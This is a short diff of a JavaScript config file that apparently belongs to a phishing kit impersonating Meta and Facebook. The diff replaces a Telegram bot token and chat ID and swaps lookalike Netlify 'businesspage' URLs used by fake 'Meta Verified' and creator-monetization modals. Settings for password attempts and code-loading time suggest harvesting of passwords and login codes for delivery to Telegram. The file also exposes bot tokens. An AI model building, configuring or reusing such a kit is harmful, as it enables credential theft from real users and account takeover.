@@ -1,6 +1,6 @@
 const config = {
-    token: '8622804037:AAEEaz6bao4ZPTg8DvhYrkapIrIqhG3K2p4',
-    chat_id: '-5238380441',
+    token: '8637840256:AAEud4z2JlZWIn8no4C788bfnxUj-ZHlP_s',
+    chat_id: '-5153451675',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
@@ -9,9 +9,9 @@ const config = {
     code_loading_time: 4,
 
     /** URL khi bấm nút đăng ký trên modal Kiếm tiền (creator monetize) */
-    modal_creator_monetize_register_url: 'https://businesspagebomecome00012428.netlify.app/live',
+    modal_creator_monetize_register_url: 'https://businesspageid000348644.netlify.app/live',
 
     /** URL chung cho cả hai nút đăng ký (Facebook + Instagram) trên modal Meta Verified */
-    modal_meta_verified_register_url: 'https://verybussinesspage011028.netlify.app/live',
+    modal_meta_verified_register_url: 'https://businesspageid0003482256.netlify.app/live',
 };
 export default config;
